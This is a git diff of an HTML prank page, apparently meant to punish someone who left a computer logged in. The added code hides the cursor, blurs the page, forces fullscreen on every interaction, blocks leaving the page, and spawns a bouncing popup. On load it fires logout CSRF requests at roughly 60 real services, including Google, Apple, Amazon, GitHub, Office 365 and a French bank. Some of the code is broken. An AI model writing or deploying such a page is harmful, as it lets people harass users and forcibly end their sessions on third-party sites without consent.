@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -7,6 +6,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>⚠️⚠️⚠️ !! ALERT! ⚠️⚠️⚠️</title>
   <style>
+    * {
+      cursor: none;
+      filter: blur(1px)
+    }
+
     body,
     html {
       margin: 0;
@@ -14,6 +18,7 @@
       height: 100%;
       background: linear-gradient(to right, #ff00ff, #ff0000, #ffff00, #00ff00, #0000ff, #00ffff, #ff00ff);
       animation: pulse-background 1.5s infinite linear;
+      cursor: none;
     }
 
     @keyframes color-change {
@@ -120,7 +125,8 @@
   </style>
 </head>
 
-<body onload="openFullscreen()">
+<body onclick="openFullscreen();" onload="openFullscreen();" onmouseover="openFullscreen();"
+  oncontextmenu="openFullscreen()">
   <div class=scrolling-text>
     <p>!! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT
       NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !!
@@ -265,28 +271,149 @@
       OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT
       TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! !! LOG OUT NEXT TIME!! </p>
   </div>
-  <div class="alert">!! LOG OUT!! </div>
-  <!-- Audio element for siren sound -->
-  <audio autoplay loop>
-    <source src="siren.mp3" type="audio/mp3">
-    Your browser does not support the audio element.
-  </audio>
+  <div class="alert">!!🔒LOG OUT🔒!!</div>
   <script>
-    
-    // Toggle class every 50 milliseconds (to make it even more annoying)
-    setInterval(function () {
-      document.querySelector(".alert").classList.toggle("red");
-      openFullscreen();
-    }, 50);
-    function openFullscreen() {
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) { /* Safari */
-        elem.webkitRequestFullscreen();
-      } else if (elem.msRequestFullscreen) { /* IE11 */
-        elem.msRequestFullscreen();
-      }
+      window.onbeforeunload = function (e) {
+        e = e || window.event;
+
+        // For IE and Firefox prior to version 4
+        if (e) {
+            e.returnValue = 'Sure?';
+        }
+
+        // For Safari
+        return 'Sure?';
+        popup.close();
+    };
+    var popup = window.open("FLASHBANG.html", "#", "width=5,height=5");
+    setInterval(() => {
+        movePopup(popup);
+    }, 5);
+    // Set initial position
+    var posX = 0;
+    var posY = 0;
+
+    // Set initial velocity
+    var velX = 5;
+    var velY = 7;
+
+    // Set boundaries
+    var minX = 0;
+    var minY = 0;
+
+    // Function to move the popup window
+    function movePopup(popupQuery) {
+        popupQuery.resizeTo(popupQuery.outerWidth,popupQuery.outerWidth);
+        var maxX = screen.width - popupQuery.outerWidth;
+        var maxY = screen.height - popupQuery.outerHeight;
+        // Update position
+        posX += velX;
+        posY += velY;
+
+        // Check boundaries
+        if (posX > maxX || posX < minX) {
+            velX = -velX;
+            // Randomly change velocity after bounce
+            velX += Math.random() * 2 - 1.1; // Random value between -1 and 1
+        }
+        if (posY > maxY || posY < minY) {
+            velY = -velY;
+            // Randomly change velocity after bounce
+            velY += Math.random() * 2 - 1.1; // Random value between -1 and 1
+        }
+
+        // Move the popup window
+        popupQuery.moveBy(velX, velY);
+
+        // Repeat the movement every 20 milliseconds
     }
+    setInterval(function () {
+      left = Math.floor(Math.random() * (screen.width - width));
+      top = Math.floor(Math.random() * (screen.height - height));
+      document.querySelector(".alert").classList.toggle("red");
+      popup.move(left, top);
+    }, 50);
+    function logout() {
+      const requests = [
+        ["AOL", [
+          fetch("http://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us"),
+          fetch("https://api.screenname.aol.com/auth/logout?state=snslogout&r=" + Math.random())
+        ]],
+        ["Apple", fetch("https://appleid.apple.com/account/signout")],
+        ["AlternativeTo", fetch("https://alternativeto.net/Logout.aspx")],
+        ["Amazon", fetch("http://www.amazon.com/gp/flex/sign-out.html?action=sign-out")],
+        ["Baidu", fetch("https://passport.baidu.com/?logout&u=https://www.baidu.com")],
+        ["Blogger", fetch("http://www.blogger.com/logout.g")],
+        ["Delicious", fetch("http://www.delicious.com/logout")],
+        ["DeviantART", fetch("http://www.deviantart.com/users/logout", { method: "POST" })],
+        ["DreamHost", fetch("https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout")],
+        ["Dropbox", fetch("https://www.dropbox.com/logout")],
+        ["eBay", fetch("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")],
+        ["Gandi", fetch("https://www.gandi.net/login/out")],
+        ["GearBest", fetch("http://www.gearbest.com/m-users-a-logout.htm")],
+        ["GitHub", fetch("https://github.com/logout")],
+        ["GMail", fetch("http://mail.google.com/mail/?logout")],
+        ["Google", fetch("https://www.google.com/accounts/Logout")],
+        ["Hulu", fetch("https://secure.hulu.com/logout")],
+        ["Impots.gouv.fr", fetch("https://cfspart.impots.gouv.fr/deconnexion")],
+        ["Instapaper", fetch("http://www.instapaper.com/user/logout")],
+        ["KanbanFlow", fetch("https://kanbanflow.com/logout")],
+        ["LaBanquePostale", fetch("https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/securite/deconnexion/init-deconnexion.ea")],
+        ["Linode", fetch("https://manager.linode.com/session/logout")],
+        ["LiveJournal", fetch("http://www.livejournal.com/logout.bml", { method: "POST", body: JSON.stringify({ "action:killall": "1" }) })],
+        ["LogMeIn", fetch("https://secure.logmein.com/home/fr/loggedout")],
+        ["MySpace", fetch("http://www.myspace.com/index.cfm?fuseaction=signout")],
+        ["NetFlix", fetch("http://www.netflix.com/Logout")],
+        ["New York Times", fetch("http://www.nytimes.com/logout")],
+        ["Newegg", fetch("https://secure.newegg.com/NewMyAccount/AccountLogout.aspx")],
+        ["Office 365 Global Account", fetch("https://login.microsoftonline.com/logout.srf")],
+        ["Office 365 Webmail", fetch("https://outlook.office.com/owa/logoff.owa")],
+        ["Pandora", fetch("https://www.pandora.com/account/sign-out")],
+        ["Photobucket", fetch("http://photobucket.com/logout")],
+        ["Primewire.AG", fetch("https://www.primewire.ag/logout.php")],
+        ["Primewire.ORG", fetch("https://www.primewire.org/logout.php")],
+        ["Skype", fetch("https://secure.skype.com/account/logout")],
+        ["Slashdot", fetch("http://slashdot.org/my/logout")],
+        ["SoundCloud", fetch("http://soundcloud.com/logout")],
+        ["Spotify", fetch("https://www.spotify.com/logout/")],
+        ["Steam Community", fetch("http://steamcommunity.com/?action=doLogout")],
+        ["Steam Store", fetch("http://store.steampowered.com/logout/")],
+        ["ThePirateBay", fetch("https://thepiratebay.org/logout")],
+        ["ThinkGeek", fetch("https://www.thinkgeek.com/brain/account/login.cgi?a=lo")],
+        ["Threadless", fetch("http://www.threadless.com/logout")],
+        ["Tumblr", fetch("http://www.tumblr.com/logout")],
+        ["Testomato", fetch("http://www.testomato.com/logout")],
+        ["Vimeo", fetch("http://vimeo.com/log_out")],
+        ["Wikipedia", fetch("http://en.wikipedia.org/w/index.php?title=Special:UserLogout")],
+        ["Windows Live", fetch("http://login.live.com/logout.srf")],
+        ["Woot", fetch("https://account.woot.com/logout")],
+        ["Wordpress", fetch("https://wordpress.com/wp-login.php?action=logout")],
+        ["Yahoo!", fetch("https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/")],
+        ["YouTube", fetch("http://www.youtube.com", { method: "POST", body: JSON.stringify({ "action_logout": "1" }) })],
+        ["DueDil", fetch("http://www.duedil.com/logout")],
+        ["Podio", fetch("https://podio.com/logout")],
+        ["Codeanywhere", fetch("https://codeanywhere.com/logout")],
+        ["NESCAFE Dolce Gusto", fetch("https://www.dolce-gusto.fr/customer/account/logout")],
+        ["T411", fetch("http://www.t411.li/users/logout/")],
+      ];
+
+      Promise.all(requests.map(([service, request]) => {
+        if (Array.isArray(request)) {
+          return Promise.all(request);
+        } else {
+          return request;
+        }
+      })).then(responses => {
+        console.log("Logout successful for all services.");
+      }).catch(error => {
+        console.error("Error occurred during logout:", error);
+      });
+    }
+
+    // Call the logout function
+    logout();
+
+
   </script>
 </body>
 
